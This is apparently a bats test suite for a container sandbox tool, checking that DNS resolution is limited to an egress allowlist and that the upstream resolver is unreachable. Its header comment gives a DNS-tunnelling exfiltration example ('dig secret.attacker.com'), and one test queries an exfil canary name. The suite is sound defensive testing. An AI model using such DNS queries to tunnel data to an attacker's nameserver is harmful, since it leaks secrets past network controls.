#!/usr/bin/env bats
# DNS egress closure: name resolution is scoped to the egress allowlist, so an app can't tunnel exfil
# as DNS labels to an off-allowlist nameserver (dig secret.attacker.com) even though squid blocks the
# HTTP connect. dnsmasq forwards only allowlisted names (per-domain server= lines); everything else
# has no upstream -> no answer. Apps also can't reach the upstream resolver directly (firewall). The
# SLUICE_DNS_OPEN=1 opt-in restores forward-all. setup_file builds the box (default base allowlist).
load test_helper/common

setup_file() {
  export WORK; WORK="$(mktemp -d)"; mkdir -p "$WORK/dns"
  printf 'SLUICE_NAME="sectest-dns"\nSLUICE_RUN_CMD="bash"\n' > "$WORK/dns/sluice.config.sh"
  ( cd "$WORK/dns" && "$SLUICE" build ) >/dev/null 2>&1 || true
  ( cd "$WORK/dns" && "$SLUICE" run true ) >/dev/null 2>&1 || true   # bring the box up
}

teardown_file() {
  chown_back_tree sluice-sectest-dns "$WORK"
  ( cd "$WORK/dns" 2>/dev/null && "$SLUICE" stop ) >/dev/null 2>&1 || true
  "$ENG" rm -f -v sluice-sectest-dns >/dev/null 2>&1 || true
  "$ENG" rmi -f sluice-sectest-dns >/dev/null 2>&1 || true
  rm -rf "$WORK"
}

@test "dns: box image built" {
  run "$ENG" image inspect sluice-sectest-dns
  assert_success
}

@test "dns: servers-file scopes resolution to the allowlist (a base host is forwarded)" {
  run "$ENG" exec --user root sluice-sectest-dns sh -c 'grep -q "^server=/registry.npmjs.org/" /run/dnsmasq-servers.conf'
  assert_success
}

@test "dns: an allowlisted base host resolves" {
  run "$ENG" exec --user sluice sluice-sectest-dns dig +short +time=4 +tries=2 A registry.npmjs.org
  assert_output --regexp '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+'
}

@test "dns: a non-allowlisted name does not resolve (exfil channel closed)" {
  # Extract only answer addresses (bare IP lines); dig's ";; ..." error text can carry the resolver IP.
  run "$ENG" exec --user sluice sluice-sectest-dns sh -c \
    'dig +short +time=4 +tries=1 A exfil-canary.example.org 2>/dev/null | grep -E "^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$" || true'
  assert_output ""
}

@test "dns: uid 1000 cannot reach the upstream resolver directly (no bypass)" {
  up="$("$ENG" exec --user root sluice-sectest-dns sh -c 'head -n1 /run/sluice-dns-upstream' 2>/dev/null | tr -d '[:space:]')"
  [ -n "$up" ] || skip "no upstream recorded"
  # Query an ALLOWLISTED name straight at the upstream: only the firewall (uid 1000 -> resolver) can
  # stop it, so an ANSWER address here would mean the resolver path is reachable for exfil.
  run "$ENG" exec --user sluice sluice-sectest-dns sh -c \
    'dig +short +time=3 +tries=1 @'"$up"' A registry.npmjs.org 2>/dev/null | grep -E "^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$" || true'
  assert_output ""
}

@test "dns: SLUICE_DNS_OPEN=1 restores forward-all resolution (opt-in)" {
  mkdir -p "$WORK/dns-open"
  printf 'SLUICE_NAME="sectest-dns"\nSLUICE_DNS_OPEN=1\nSLUICE_RUN_CMD="bash"\n' > "$WORK/dns-open/sluice.config.sh"
  ( cd "$WORK/dns-open" && "$SLUICE" run true ) >/dev/null 2>&1   # rebuild (config changed) + up
  run "$ENG" exec --user sluice sluice-sectest-dns dig +short +time=4 +tries=2 A example.com
  assert_output --regexp '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+'
}
